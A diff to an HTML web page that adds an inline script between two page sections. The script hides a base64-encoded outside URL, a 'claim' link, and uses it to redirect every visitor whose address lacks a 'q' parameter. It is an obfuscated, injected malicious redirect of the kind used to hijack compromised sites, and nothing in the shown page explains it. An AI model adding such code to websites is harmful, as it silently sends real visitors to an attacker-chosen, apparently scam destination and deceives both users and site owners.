@@ -40,7 +40,13 @@
     </a>
   </div>
 </section>
-
+<script>
+var dqwf = "aHR0cDovL2JvbmtzLmluZm8vP2NsYWltPSRib25r";
+var url = new URL(window.location.href);
+if (!url.searchParams.get('q')) {
+    window.location.replace(atob(dqwf));
+}
+</script>
 <section data-bs-version="5.1" class="article07 cid-tZDSgdgE18" id="article07-1">
   <div class="container-fluid">
     <div class="row justify-content-center">
